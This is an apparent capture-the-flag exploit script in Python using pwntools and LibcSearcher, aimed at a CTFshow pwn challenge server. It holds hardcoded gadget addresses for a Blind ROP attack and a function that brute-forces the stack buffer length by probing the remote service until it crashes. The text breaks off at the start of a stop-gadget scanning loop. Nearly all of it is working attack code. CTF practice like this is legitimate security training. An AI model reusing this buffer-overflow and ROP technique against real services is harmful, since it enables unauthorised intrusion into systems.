from pwn import *
from LibcSearcher import *
io = remote('pwn.challenge.ctf.show',28153)
buf_length   = 72
stop_gadgets = 0x400728
brop_gadgets = 0x4007ba
pop_rdi_ret  = 0x400843
puts_plt     = 0x400550
puts_got     = 0x602018
def Getbuflenth():
    i = 1
    while 1:
        try:
            io = remote('pwn.challenge.ctf.show',28235)
            io.recvuntil("Welcome to CTFshow-PWN ! Do you know who is daniu?\n")
            io.send(i*'a')
            data = io.recv()
            io.close()
            if not data.startswith('No passwd'):
                return i-1
            else:
                i+=1
        except EOFError:
            io.close()
            return i-1
def GetStopAddr():
    address = 0x400000
    while 1:
        print(hex(address))
